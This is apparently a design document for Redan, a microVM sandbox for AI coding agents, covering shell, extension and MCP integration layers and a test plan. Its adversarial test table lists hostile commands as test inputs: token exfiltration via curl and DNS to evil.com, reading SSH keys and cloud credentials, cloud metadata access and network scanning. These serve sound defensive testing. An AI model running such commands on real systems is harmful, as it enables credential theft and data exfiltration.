# 6. Agent Integration Deep-Dive

## 6.1 Layer 1: Sandboxed Shell (Agent-Agnostic)

The foundation. Any agent that runs in a terminal runs inside Redan.

### How Each Agent Handles Execution Environments

#### Claude Code

- **Runtime:** Node.js (TypeScript). Distributed via npm.
- **Execution:** Spawns shell processes for `bash` tool, direct filesystem ops for `read`/`write`/`edit`.
- **VM compatibility assessment:**
  - ✅ Can run in any Linux environment with Node.js
  - ✅ Respects `$HOME`, `$CWD`, standard env vars
  - ⚠️ Expects `~/.claude/` for settings and session state (inside VM, ephemeral — means no persistent settings across sessions)
  - ⚠️ Checks for updates via npm (needs `registry.npmjs.org` in allowlist)
  - ⚠️ Uses `git` for project context (git must be in image, `.git` dir accessible via virtio-fs mount)
  - ❌ MCP server connections from inside VM need to reach host MCP servers (if configured)
- **Blockers for transparent VM operation:**
  - Node.js must be in the OCI image
  - Claude Code must be installed in the image (or installed on first boot — slow)
  - API key for Claude/Anthropic must be available (via secret injection or `env` injection mode)

**Recommendation:** Provide a `redan/claude` OCI image with Node.js + Claude Code pre-installed. For MVP, document manual setup: `redan exec --image node:22 -- npx @anthropic-ai/claude-code`.

#### Codex (OpenAI)

- **Runtime:** Rust binary (since late 2025 rewrite).
- **Execution:** Runs commands in sandboxed containers by default. We'd be sandboxing the sandbox — or running in non-sandboxed mode inside our VM.
- **VM compatibility assessment:**
  - ✅ Single binary, easy to install in image
  - ⚠️ Its own sandbox (Docker/container) won't work inside our VM (no Docker)
  - ⚠️ Must run in non-sandboxed mode (disable Codex's own sandbox, rely on Redan's)
  - ⚠️ Needs OpenAI API access (allowlist + secret injection)
- **Blockers:** Codex's sandboxed mode conflicts with running inside Redan. Need to disable Codex's sandbox and rely on Redan's.

#### Cursor (Agent Mode)

- **Runtime:** Electron app (VS Code fork). Terminal agent runs in integrated terminal.
- **VM compatibility:** ❌ for the full IDE. The IDE runs on host; only the terminal commands could theoretically route to a VM.
- **Integration path:** Not Layer 1. Cursor integration requires MCP (Layer 3) or a more creative approach where Cursor's terminal shell is a `redan exec` session.
- **Workaround:** User configures Cursor's terminal to use `redan exec -- bash` as the shell. All commands Cursor executes go through Redan. Hacky but functional.

#### Amp (Sourcegraph)

- **Runtime:** CLI tool.
- **VM compatibility assessment:**
  - ✅ CLI, can run inside VM
  - ⚠️ Needs Sourcegraph API access
  - ⚠️ Relatively new, execution model may change
- **Integration:** Same as Claude Code — install in image, configure secrets.

#### Pi

- **Runtime:** Node.js (TypeScript). CLI + TUI.
- **VM compatibility assessment:**
  - ✅ Runs in terminal, Node.js based
  - ✅ RPC mode (JSON over stdin/stdout) works in any environment
  - ✅ Extension system could intercept tool calls
  - ⚠️ Needs various API keys (model providers)
  - ⚠️ Extensions and skills loaded from host filesystem — need mount or pre-install
- **Integration:** Best candidate for Layer 2 (deep integration). Layer 1 works too.

### Layer 1 Guarantees

| Guarantee | Mechanism |
|-----------|-----------|
| No host credential access | VM filesystem boundary. `~/.ssh` etc. don't exist. |
| Network policy enforcement | All traffic through host proxy. VM-level, not bypassable. |
| Secret injection (HTTP) | MITM proxy replaces placeholders in headers. |
| Audit trail | Every connection logged by host proxy. |
| Project file access | virtio-fs mount at `/workspace`. |

### Layer 1 DX Trade-offs

| Trade-off | Impact | Mitigation |
|-----------|--------|------------|
| Boot latency | 200-500ms before session starts | Progress indicator on stderr |
| No persistent state | Agent settings, package caches lost between sessions | Named volumes (v1.1) |
| Image setup | Agent must be installed in OCI image | Pre-built images, or first-boot install script |
| Filesystem performance | virtio-fs overhead on large directories | `.redanignore` (v1.1), benchmarking |
| No Docker inside VM | Agents that run Docker commands fail | Documented limitation |

## 6.2 Layer 2: Pi SDK/Extension Integration

### Pi Extension API Analysis

Pi extensions hook into the agent lifecycle. Relevant hooks for Redan:

```typescript
// Pi extension hooks (from Pi SDK)
pi.on("session_start", async (session) => {
    // Boot Redan VM, configure policy
});

pi.on("tool_call", async (call, context) => {
    // Intercept bash/write/read/edit, execute in VM
});

pi.on("session_end", async (session) => {
    // Tear down VM, finalize audit log
});
```

**What we'd intercept:**
- `bash` tool calls → execute command in VM, return stdout/stderr/exit code
- `write` tool calls → write file in VM's `/workspace` (synced via virtio-fs)
- `read` tool calls → read file from VM's `/workspace`
- `edit` tool calls → apply edit in VM's `/workspace`

**What we'd pass through:**
- `generate_image`, `subagent`, and other non-execution tools run on host

### Pi RPC Mode as Proxy Point

Pi's RPC mode (JSON over stdin/stdout) enables a proxy architecture:

```
Host:  redan-pi-proxy  ←stdin/stdout→  Pi RPC  ←stdin/stdout→  redan VM
```

The proxy intercepts tool call responses from Pi and routes execution-related calls to the VM. Non-execution calls pass through to Pi directly.

**Advantage:** Works without modifying Pi. The proxy is a transparent middleman.
**Disadvantage:** Added complexity, potential for desync between proxy and Pi state.

### Layer 2 Guarantees

Same as Layer 1, plus:
- Per-tool-call granularity (know exactly which tool call triggered which network request)
- Agent doesn't know it's sandboxed (transparent interception)
- Non-execution tools run on host (faster, no VM overhead for image generation etc.)

### Layer 2 DX Trade-offs

| Trade-off | Impact | Mitigation |
|-----------|--------|------------|
| Pi-specific | Only works with Pi | Layer 1 and 3 cover other agents |
| Extension maintenance | Must track Pi extension API changes | Pin to Pi SDK version, test in CI |
| Split execution | Some tools in VM, some on host | Clear categorization, configurable |

## 6.3 Layer 3: MCP Server

### MCP Tool Definitions

```json
{
    "name": "redan",
    "version": "0.1.0",
    "tools": [
        {
            "name": "exec",
            "description": "Execute a command in a secure microVM sandbox with network policy and secret management.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "Shell command to execute"
                    },
                    "working_dir": {
                        "type": "string",
                        "description": "Working directory (relative to /workspace)",
                        "default": "/workspace"
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Timeout in seconds",
                        "default": 300
                    }
                },
                "required": ["command"]
            }
        },
        {
            "name": "write_file",
            "description": "Write content to a file inside the sandbox.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "path": { "type": "string" },
                    "content": { "type": "string" }
                },
                "required": ["path", "content"]
            }
        },
        {
            "name": "read_file",
            "description": "Read a file from inside the sandbox.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "path": { "type": "string" }
                },
                "required": ["path"]
            }
        }
    ]
}
```

### MCP Integration Model

```
Agent (any MCP client)
    ↓ MCP protocol (stdio or HTTP)
redan mcp (MCP server process)
    ↓ manages VM session
Guest VM
    ↓ executes commands, returns results
redan mcp
    ↓ returns tool results
Agent
```

**Session management:** The MCP server maintains a single VM session across multiple tool calls. The VM boots on first tool call and stays running until the MCP connection closes (or timeout).

### Layer 3 Guarantees

| Guarantee | Status |
|-----------|--------|
| Network policy | ✅ Same as Layer 1 |
| Secret injection | ✅ Same as Layer 1 |
| Audit trail | ✅ Same as Layer 1 |
| Agent transparency | ⚠️ Agent must explicitly call `redan.exec` instead of `bash` |

The agent knows it's sandboxed because it's calling Redan-specific MCP tools. This is the trade-off: universal compatibility (any MCP client) but less transparent than Layer 1 or 2.

### Layer 3 DX Trade-offs

| Trade-off | Impact | Mitigation |
|-----------|--------|------------|
| Agent must use MCP | Requires MCP-capable agent | Most major agents support MCP |
| Not transparent | Agent calls `redan.exec` not `bash` | Agent can learn to prefer sandboxed tools |
| Per-call overhead | Each tool call goes through MCP + VM | VM stays running across calls, overhead is IPC only |
| Configuration | Agent must be configured to use Redan MCP server | Document setup per agent |

## 6.4 Recommended Integration Priority

| Priority | Layer | Target | Effort | Value |
|----------|-------|--------|--------|-------|
| 1 (MVP) | Layer 1 | Any CLI agent | Core product | Highest — works with everything |
| 2 (v1.0) | Layer 3 | MCP-capable agents | Medium | Broad compatibility |
| 3 (v1.1) | Layer 2 | Pi users | Medium | Deep integration, best DX |

Layer 1 IS the product. Layers 2 and 3 are integration modes that build on it.

## 6.5 Test Plan

### Functional Tests

| Test | Layer | Verification |
|------|-------|-------------|
| Agent can read project files | 1,2,3 | `cat /workspace/README.md` returns correct content |
| Agent can write project files | 1,2,3 | Write in VM, verify on host |
| Agent can reach allowed hosts | 1,2,3 | `curl api.github.com` succeeds |
| Agent cannot reach blocked hosts | 1,2,3 | `curl evil.com` fails/times out |
| Secret injected for allowed host | 1,2,3 | Request to `api.github.com` succeeds with auth |
| Secret NOT injected for other host | 1,2,3 | Request to `evil.com` with placeholder fails |
| Host credentials not visible | 1,2,3 | `ls ~/.ssh`, `cat ~/.aws/credentials` → not found |
| Audit log records all decisions | 1,2,3 | Parse JSONL, verify entries for each action |
| Exit code propagated | 1 | Guest `exit 42` → redan exits 42 |
| Ctrl+C forwarded | 1 | SIGINT reaches guest process |

### Adversarial Tests

| Test | Attack | Expected Result |
|------|--------|-----------------|
| Exfiltrate env var | `curl evil.com -d "$GITHUB_TOKEN"` | Connection blocked. evil.com never receives data. |
| DNS exfiltration | `dig $(echo $GITHUB_TOKEN).evil.com` | DNS resolved on host. Only placeholder in query. evil.com sees meaningless string. |
| Read host SSH key | `cat /root/.ssh/id_ed25519` | ENOENT. File does not exist in VM. |
| Escape via /proc | `cat /proc/1/environ` on host PID | /proc shows VM processes only, not host. |
| Write to host filesystem | `echo "pwned" > /etc/crontab` | Writes to VM /etc, not host. VM is ephemeral. |
| Network scan | `nmap 192.168.1.0/24` | Private ranges blocked by policy. |
| Access cloud metadata | `curl 169.254.169.254` | Link-local blocked by policy. |
| Pivot via allowed host | Craft request to api.github.com that redirects/proxies to evil.com | Proxy follows redirects — if redirect target is not in allowlist, it's blocked. |
| Extract secret from response | Make api.github.com echo auth header, read response | Secret visible in VM (documented behavior). Can't exfiltrate due to network policy. |

### Agent Compatibility Tests

Run each agent inside Redan and verify basic functionality:

| Agent | Test Scenario | Pass Criteria |
|-------|--------------|---------------|
| Claude Code | Create a Python file, run it, commit to git | All tools work, git operations succeed |
| Codex (no-sandbox mode) | Edit a file, run tests | File edits persist, test output correct |
| Pi | Run a coding task via RPC mode | Tool calls execute, results return correctly |
| bash (manual) | Interactive session, install packages, run scripts | Standard developer workflow works |

## Key Decisions

1. **Layer 1 is the MVP.** Environment injection. Agent runs in VM. No agent-specific code. ✅

2. **MCP (Layer 3) before Pi extension (Layer 2).** MCP is more broadly useful. Pi extension is a nice-to-have that requires tracking a fast-moving API. ✅

3. **Adversarial test suite from day one.** Security product without adversarial tests is theater. Run these in CI. ✅

## Open Questions

1. **Claude Code inside VM needs Anthropic API key.** This is a secret that the agent uses directly (not via network injection — it's the model API). Do we inject `ANTHROPIC_API_KEY` via `inject_mode = "env"` (weaker, visible in VM) or via header injection to `api.anthropic.com`? Header injection is cleaner but Claude Code's internal HTTP client would need to use the placeholder. Likely `inject_mode = "env"` for model API keys — the model provider is trusted, and the agent needs the key to function.

2. **MCP server lifecycle:** Does `redan mcp` run as a long-lived server or start per-agent-session? Long-lived allows warm VMs but complicates cleanup. Per-session is simpler. Recommendation: per-session, started by the agent's MCP client configuration.

3. **Redirect following in proxy:** If the agent requests `api.github.com/redirect` and gets a 302 to `evil.com`, does the proxy block the redirect? It should — the proxy handles each connection independently, and the redirect target connection would be a new connection checked against the allowlist. But: the agent's HTTP client follows the redirect, not the proxy. The proxy only sees the new connection to `evil.com` and blocks it. Correct behavior, but verify.
